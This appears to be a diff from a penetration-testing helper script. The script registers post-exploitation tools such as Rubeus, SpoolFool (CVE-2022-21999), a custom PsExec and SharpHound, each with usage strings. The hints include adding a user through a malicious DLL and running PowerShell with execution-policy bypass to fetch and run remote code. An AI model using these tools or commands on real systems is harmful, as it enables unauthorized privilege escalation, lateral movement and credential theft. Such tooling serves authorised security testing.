@@ -452,9 +452,9 @@ pandora('vb-1')
 
 cs_exe('Rubeus.exe', 'Rubeus')
 cs_exe('SpoolSample.exe', 'SpoolSample', 'SpoolSample.SpoolSample')
-cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999)')
+cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999) on Windows Desktop ( Invoke-SpoolFool -dll AddUser.dll )')
 cs_exe('myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")', 
-        'myPsExec.Program', 'Invoke-mPsExec')
+        'myPsExec.Program')
 #cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
 cs_exe('SQL.exe', '[SQL.SQL]::Main(@("<servername>", "<sql>")) # separator = `n', 'SQL.SQL')
 cs_exe('SharpHound.exe', '[SharpHound.Program]::Main(@("-c", "All,GPOLocalGroup", "--outputdirectory", "$env:tmp", "-s"))', 
